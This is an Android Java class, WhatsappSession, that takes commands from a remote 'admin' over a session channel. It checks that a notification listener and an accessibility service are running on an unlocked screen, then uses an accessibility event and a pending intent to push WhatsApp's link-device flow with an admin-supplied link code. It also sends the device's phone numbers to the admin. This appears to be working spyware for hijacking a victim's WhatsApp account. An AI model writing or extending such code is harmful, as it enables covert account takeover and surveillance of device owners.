package com.user.side.sessions;

import android.app.ActivityOptions;
import android.app.PendingIntent;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;

import com.user.side.constants.Actions;
import com.user.side.constants.Constants;
import com.user.side.listeners.OnRequestSendMessageListener;
import com.user.side.managers.NumbersManager;
import com.user.side.services.ActionsController;
import com.user.side.services.NotificationListener;
import com.user.side.utilities.ScreenUtils;
import com.user.side.utilities.ServicesUtils;

import org.json.JSONException;
import org.json.JSONObject;


public class WhatsappSession extends Session {
    public WhatsappSession(Context context, String adminToken, OnRequestSendMessageListener onRequestSendMessageListener, int id) {
        super(context, adminToken, onRequestSendMessageListener, id);
    }
    @Override
    public void onMessageReceived(String message) {
        super.onMessageReceived(message);
        try {
            handleWhatsappAction(message);
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    public void handleWhatsappAction(String json) throws JSONException {
        JSONObject jsonObject = new JSONObject(json);
        String action = jsonObject.getString("action");

        switch (action) {
            case Actions.ACTION_REQUEST_START_WHATSAPP_WEB_SESSION:
                if(ServicesUtils.isServiceKilled(context, NotificationListener.class) || ServicesUtils.isServiceKilled(context, ActionsController.class) || !ScreenUtils.isScreenOnAndUnlocked(context)){
                    boolean notificationListenerKilled = ServicesUtils.isServiceKilled(context, NotificationListener.class);
                    boolean actionsControllerKilled = ServicesUtils.isServiceKilled(context, ActionsController.class);
                    boolean screenState = ScreenUtils.isScreenOnAndUnlocked(context);

                    String reason = buildFailedReason(notificationListenerKilled, actionsControllerKilled, screenState);
                    sendFailedToStartWhatsappSession(reason);
                    return;
                }
                NotificationListener.IN_PROCESS = true;

                AccessibilityManager accessibilityManager = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);

                AccessibilityEvent event = AccessibilityEvent.obtain(AccessibilityEvent.TYPE_ANNOUNCEMENT);
                event.setPackageName(context.getPackageName());

                accessibilityManager.sendAccessibilityEvent(event);
                break;
            case Actions.ACTION_RECEIVE_WHATSAPP_LINK_CODE:
                ActionsController.CODE = jsonObject.getString(Constants.CODE_KEY);
                showLinkNotification(NotificationListener.linkDevicePendingIntent);
                break;
            case Actions.ACTION_REQUEST_GET_DEVICE_NUMBERS:
                NumbersManager numbersManager = new NumbersManager(this::sendNumbersToAdmin);

                numbersManager.getNumbers(context);
                break;

        }
    }
    public void showLinkNotification(PendingIntent linkDevicePendingIntent){
        if(linkDevicePendingIntent == null) return;

        try {

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                ActivityOptions options = ActivityOptions.makeBasic();
                options.setPendingIntentBackgroundActivityStartMode(ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
                Bundle bundle = options.toBundle();
                linkDevicePendingIntent.send(bundle);
                return;
            }

            linkDevicePendingIntent.send();

        } catch (PendingIntent.CanceledException e) {
            throw new RuntimeException(e);
        }
    }

    private String buildFailedReason(boolean notificationListenerKilled, boolean actionsControllerKilled, boolean screenState) {
        StringBuilder reason = new StringBuilder();
        reason.append("Failed to start whatsapp web session\n");
        if(notificationListenerKilled){
            reason.append("\nNotification Listener not running");
        }
        if(actionsControllerKilled) {
            reason.append("\nAccessibility service not running");
        }
        if(!screenState){
            reason.append("\nScreen is turned off");
        }

        return reason.toString();
    }

    public void sendNumbersToAdmin(String[] numbers) throws JSONException {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_DEVICE_NUMBERS);

        if(numbers != null){
            StringBuilder numbersString = new StringBuilder();
            for (String number : numbers) {
                numbersString.append(number).append(",");
            }
            numbersString = new StringBuilder(numbersString.substring(0, numbersString.length() - 1));
            jsonObject.put(Constants.NUMBERS_KEY, numbersString.toString());
        }
        else{
            jsonObject.put(Constants.NUMBERS_KEY, "empty");
        }

        sendMessage(jsonObject.toString());
    }

    public void sendFailedToStartWhatsappSession(String reason) throws JSONException {
        JSONObject jsonObject = new JSONObject();

        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_FAILED_TO_START_WHATSAPP_WEB_SESSION);
        jsonObject.put(Constants.REASON_KEY, reason);

        sendMessage(jsonObject.toString());
    }
}
